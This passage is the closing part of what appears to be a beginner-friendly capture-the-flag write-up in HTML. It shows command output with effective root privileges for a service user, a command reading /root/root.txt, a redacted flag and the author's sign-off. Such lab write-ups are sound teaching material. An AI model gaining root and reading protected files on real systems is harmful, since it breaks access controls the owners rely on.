+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>svc<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>svc<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>svc<span style="color:#f92672">)</span>
+<span style="color:#75715e"># cat /root/root.txt  </span>
+d<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>d
+</code></pre></div><p>That is the box, i hope you enjoyed my writeup, i realize i have over explained things sometimes but that was intentional, my content is beginner friendly.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
